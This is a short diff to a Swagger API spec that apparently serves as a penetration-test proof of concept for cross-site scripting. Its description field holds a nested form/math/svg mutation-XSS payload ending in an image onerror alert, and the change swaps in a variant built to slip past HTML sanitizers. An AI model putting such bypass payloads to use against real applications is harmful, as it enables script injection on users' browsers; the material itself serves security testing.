@@ -2,8 +2,8 @@ swagger: '2.0'
 info:
   title: Prueba de Concepto - Cross-Site Scripting
   description: |
-       <form><math><mtext></form><form><mglyph><svg><mtext><img onerror=alert('XSS') src=1>"></form>
-  version: PentestKPMG
+       <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('XSS') src=1>"></form>
+version: PentestKPMG
 basePath: /JSSResource/
 produces:
   - application/xml
